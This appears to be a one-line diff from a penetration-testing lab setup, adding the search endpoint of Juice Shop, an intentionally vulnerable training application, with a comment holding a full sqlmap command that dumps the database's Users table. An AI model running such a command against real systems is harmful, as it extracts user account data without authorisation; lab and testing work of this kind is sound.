@@ -1,0 +1,1 @@
+http://juice-shop:3000/rest/products/search?q=test (GET)  # /usr/bin/sqlmap -u http://juice-shop:3000/rest/products/search?q=test --batch --dbms=sqlite -T Users --dump --threads 10 --output-dir=/root/output/sqlmap --random-agent
